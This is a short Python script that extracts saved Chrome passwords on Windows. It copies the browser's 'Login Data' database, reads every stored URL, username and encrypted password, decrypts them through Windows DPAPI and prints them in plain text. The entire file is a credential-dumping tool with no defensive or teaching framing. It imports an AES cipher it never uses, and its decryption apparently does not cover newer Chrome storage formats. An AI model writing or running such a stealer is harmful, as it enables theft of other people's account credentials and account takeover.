import os
import sqlite3
import json
import base64
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import win32crypt

def get_chrome_passwords():
    """Extract saved Chrome passwords from the local database."""
    try:
        # Path to Chrome's Login Data database
        chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                   r"Google\Chrome\User Data\Default\Login Data")

        # Copy the database (Chrome locks the original)
        temp_db = "LoginData_copy.db"
        shutil.copy2(chrome_path, temp_db)

        # Connect to the database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        # Query saved passwords
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        credentials = cursor.fetchall()

        # Decrypt and display passwords
        saved_passwords = []
        for url, username, password in credentials:
            try:
                password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
            except:
                password = "Unable to decrypt"

            saved_passwords.append((url, username, password))

        # Close connection and delete temp file
        conn.close()
        os.remove(temp_db)

        return saved_passwords if saved_passwords else "No saved passwords found."

    except Exception as e:
        return f"Error: {e}"

# Run and display saved passwords
passwords = get_chrome_passwords()
if isinstance(passwords, list):
    print("\nSaved Chrome Passwords:\n")
    for site, user, pwd in passwords:
        print(f"Site: {site} | Username: {user} | Password: {pwd}")
else:
    print(passwords)
